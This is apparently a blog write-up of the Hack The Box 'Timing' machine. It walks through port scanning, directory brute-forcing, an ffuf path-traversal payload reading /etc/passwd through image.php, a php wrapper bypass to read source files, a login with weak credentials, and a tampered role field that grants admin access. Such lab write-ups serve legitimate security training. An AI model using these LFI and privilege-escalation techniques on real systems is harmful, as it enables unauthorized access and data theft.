---
layout: default
title : muzec - Timing HTB Writeup
---

![image](https://user-images.githubusercontent.com/69868171/148070535-ebda7c61-e1a6-43b5-993f-bf66cb1df164.png)

We always start with an nmap scan.....

```
nmap -p- --min-rate 10000 -oA nmap/allports -v IP
```

```
# Nmap 7.91 scan initiated Thu Dec 30 21:36:12 2021 as: nmap -p- --min-rate 10000 -oA nmap/allports -v 10.10.11.135
Increasing send delay for 10.10.11.135 from 5 to 10 due to 22 out of 72 dropped probes since last increase.
Increasing send delay for 10.10.11.135 from 20 to 40 due to 16 out of 51 dropped probes since last increase.
Increasing send delay for 10.10.11.135 from 160 to 320 due to 42 out of 139 dropped probes since last increase.
Increasing send delay for 10.10.11.135 from 320 to 640 due to 11 out of 11 dropped probes since last increase.
Increasing send delay for 10.10.11.135 from 640 to 1000 due to 11 out of 11 dropped probes since last increase.
Warning: 10.10.11.135 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.11.135
Host is up (0.22s latency).
Not shown: 63014 filtered ports, 2519 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
# Nmap done at Thu Dec 30 21:39:01 2021 -- 1 IP address (1 host up) scanned in 168.93 seconds
```

We have two open ports let confirm what we have running with service detection and default nmap scripts.

```
nmap -sC -sV -oA nmap/normal -p 22,80 IP
```

```
# Nmap 7.91 scan initiated Thu Dec 30 21:39:04 2021 as: nmap -sC -sV -oA nmap/normal -p 22,80 10.10.11.135
Nmap scan report for 10.10.11.135
Host is up (0.24s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d2:5c:40:d7:c9:fe:ff:a8:83:c3:6e:cd:60:11:d2:eb (RSA)
|   256 18:c9:f7:b9:27:36:a1:16:59:23:35:84:34:31:b3:ad (ECDSA)
|_  256 a2:2d:ee:db:4e:bf:f9:3f:8b:d4:cf:b4:12:d8:20:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Simple WebApp
|_Requested resource was ./login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Dec 30 21:39:22 2021 -- 1 IP address (1 host up) scanned in 17.81 seconds
```

You can see it flashy now lol so without wasting to much of time let start diggng in make sure to add `10.10.11.135 timing.htb` to your host file.

![image](https://user-images.githubusercontent.com/69868171/148071354-ee14869b-0b8d-455c-80cc-717699aa0645.png)

Simple WebApp interesting and we have a login page before coming back to try some default credentials let keep gobuster running in the background.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/10.10.11.135]
└─$ gobuster dir -u http://timing.htb/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php,html,bak,sh -o gobuster.req
/images               (Status: 301) [Size: 309] [--> http://timing.htb/images/]
/index.php            (Status: 302) [Size: 0] [--> ./login.php]
/login.php            (Status: 200) [Size: 5609]
/profile.php          (Status: 302) [Size: 0] [--> ./login.php]
/image.php            (Status: 200) [Size: 0]
/header.php           (Status: 302) [Size: 0] [--> ./login.php]
/footer.php           (Status: 200) [Size: 3937]
/upload.php           (Status: 302) [Size: 0] [--> ./login.php]
```
Now it getting interesting but i notice something strange you can see it also right `image.php` size seems empty possible `LFI or RCE` let confirm it.

![image](https://user-images.githubusercontent.com/69868171/148072267-ba66038e-7acb-4371-87d2-915c1ffe7662.png)

Yes i know it blank let burst for some parametes.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/10.10.11.135]
└─$ ffuf -c -ic -r -u 'http://timing.htb/image.php?FUZZ=../../../../../../../etc/passwd' -w /usr/share/seclists/Discovery/Web-Content/common.txt -fs  0
img                     [Status: 200, Size: 25, Words: 3, Lines: 1]
:: Progress: [4681/4681] :: Job [1/1] :: 93 req/sec :: Duration: [0:00:49] :: Errors: 0 ::
```
Boom we found one parameter i told you it `LFI` let confirm it now by reading the passwd file from the system.

![image](https://user-images.githubusercontent.com/69868171/148073040-6024c8e2-a2ea-45a6-a75e-c311dcc0b4fc.png)

But when i try to i got blocked which is interesting let try some bypass.

![image](https://user-images.githubusercontent.com/69868171/148073393-84198eeb-d355-4035-a238-6dee5bfdcc9e.png)

Boom the php wrapper worked and we got the passwd file let try to decode it.

![image](https://user-images.githubusercontent.com/69868171/148073558-74db3072-41cf-47fd-89f0-07407e685208.png)

Now back to the login page let try and see if we can get the credentials from the `login.php` .

![image](https://user-images.githubusercontent.com/69868171/148073772-18f9c3c7-750c-49d2-acb3-6b4690543bf1.png)

But nothing man let check `db_conn.php` and see.

![image](https://user-images.githubusercontent.com/69868171/148074016-1b934436-a0d2-411b-b709-e2d3a311da73.png)

Boom a credentials but when i try it i got no luck also with some default usernames but nothing if we can recall i think we got some usernames on the passwd file let try it.

![image](https://user-images.githubusercontent.com/69868171/148074575-d7c88c76-aad0-4900-b68c-1bfd7e3867ac.png)

Boom we got in using;

```
username:- aaron
password:- aaron
```

Now that we have access going back to our gobuster result i think we found `upload.php` but when i ty to access it i got redirected to `index.php` let try using the `LFI` we got to read the page source code of `upload.php` .

**Upload.php Source Code**

```
<?php
include("admin_auth_check.php");

$upload_dir = "images/uploads/";

if (!file_exists($upload_dir)) {
    mkdir($upload_dir, 0777, true);
}

$file_hash = uniqid();

$file_name = md5('$file_hash' . time()) . '_' . basename($_FILES["fileToUpload"]["name"]);
$target_file = $upload_dir . $file_name;
$error = "";
$imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

if (isset($_POST["submit"])) {
    $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
    if ($check === false) {
        $error = "Invalid file";
    }
}

// Check if file already exists
if (file_exists($target_file)) {
    $error = "Sorry, file already exists.";
}

if ($imageFileType != "jpg") {
    $error = "This extension is not allowed.";
}

if (empty($error)) {
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        echo "The file has been uploaded.";
    } else {
        echo "Error: There was an error uploading your file.";
    }
} else {
    echo "Error: " . $error;
}
?>
```

Seems it can only be accessible by admin which we are not yet let check `profile.php` source code also.

**Profile.php Source Code**

```
<?php
include_once "header.php";

include_once "db_conn.php";

$id = $_SESSION['userid'];


// fetch updated user
$statement = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$result = $statement->execute(array('id' => $id));
$user = $statement->fetch();


?>

<script src="js/profile.js"></script>


<div class="container bootstrap snippets bootdey">

    <div class="alert alert-success" id="alert-profile-update" style="display: none">
        <strong>Success!</strong> Profile was updated.
    </div>

    <h1 class="text-primary"><span class="glyphicon glyphicon-user"></span>Edit Profile</h1>
    <hr>
    <div class="row">
        <!-- left column -->
        <div class="col-md-1">
        </div>

        <!-- edit form column -->
        <div class="col-md-9 personal-info">
            <h3>Personal info</h3>
            <form class="form-horizontal" role="form" id="editForm" action="#" method="POST">
                <div class="form-group">
                    <label class="col-lg-3 control-label">First name:</label>
                    <div class="col-lg-8">
                        <input class="form-control" type="text" name="firstName" id="firstName"
                               value="<?php if (!empty($user['firstName'])) echo $user['firstName']; ?>">
                    </div>
                </div>
                <div class="form-group">
                    <label class="col-lg-3 control-label">Last name:</label>
                    <div class="col-lg-8">
                        <input class="form-control" type="text" name="lastName" id="lastName"
                               value="<?php if (!empty($user['lastName'])) echo $user['lastName']; ?>">
                    </div>
                </div>
                <div class="form-group">
                    <label class="col-lg-3 control-label">Company:</label>
                    <div class="col-lg-8">
                        <input class="form-control" type="text" name="company" id="company"
                               value="<?php if (!empty($user['company'])) echo $user['company']; ?>">
                    </div>
                </div>
                <div class="form-group">
                    <label class="col-lg-3 control-label">Email:</label>
                    <div class="col-lg-8">
                        <input class="form-control" type="text" name="email" id="email"
                               value="<?php if (!empty($user['email'])) echo $user['email']; ?>">
                    </div>
                </div>

                <div class="container">
                    <div class="row">
                        <div class="col-md-9 bg-light text-right">

                            <button type="button" onclick="updateProfile()" class="btn btn-primary">
                                Update
                            </button>

                        </div>
                    </div>
                </div>

            </form>
        </div>
    </div>
</div>
<hr>

<?php
include_once "footer.php";
?>
```

Now that is interesting i can see a role form but when i check `http://timing.htb/profile.php` the role form is missing but for the rest which are present.

![image](https://user-images.githubusercontent.com/69868171/148076009-441cd508-18e8-4d6d-9c49-2f2a1f547bc3.png)

I quickly fire on my burp suite to intercept the request and send to repeater.

![image](https://user-images.githubusercontent.com/69868171/148076461-3915a553-e490-44f0-91e1-009ccbfc690e.png)

Damn that is some bad practice we can see everything also the password hash and the role and id etc seems we can see the role in the source code of the `profile.php` that mean it possible to update the role let hit it.

![image](https://user-images.githubusercontent.com/69868171/148077165-7d25f435-cc68-444f-b96c-50da7fcb1295.png)

Boom and we can see the role change to `1` from `0` let refresh our page to confirm if we have access to the admin dashboard.

![image](https://user-images.githubusercontent.com/69868171/148077360-889e2bc0-272f-40ad-bfae-68af6c13cd74.png)

Boom we are good now we have access to the admin panel and we have an upload page.

![image](https://user-images.githubusercontent.com/69868171/148077767-e6dabd53-3bc9-456f-a659-5845d43bcffe.png)

